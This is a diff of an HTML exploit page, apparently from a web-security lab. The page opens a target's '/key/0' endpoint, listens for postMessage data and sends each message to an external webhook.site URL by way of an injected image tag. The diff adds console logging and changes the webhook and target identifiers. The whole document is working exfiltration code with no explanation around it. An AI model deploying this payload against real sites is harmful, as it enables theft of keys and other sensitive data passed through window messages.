@@ -6,25 +6,27 @@
 
     <script>
     function listener(event) {
-        document.write("<img src='https://webhook.site/4314bf30-5ce3-4919-a7ea-d88e77b2eb85/?data="+event.data+"'></img>");
+        console.log("Message received:", event.data);
+        document.write("<img src='https://webhook.site/094c8223-b8d3-44d0-9f4c-4b6e57060d77/"+event.data+"'></img>");
     }
-    if (window.addEventListener){
 
+    if (window.addEventListener) {
+        console.log("Adding event listener");
         addEventListener("message", listener, false);
-
     } else {
-
+        console.log("Attaching event listener");
         attachEvent("onmessage", listener);
-
     }
-
     </script>
 
 </head>
 
 <body>
 
-    <script>window.open('http://ptl-c1cb5798-5d605bfc.libcurl.so/key/0');</script>
+    <script>
+        console.log("Opening new window");
+        window.open('http://ptl-2139f587-9ee14626.libcurl.so/key/0');
+    </script>
 
 </body>
 </html>
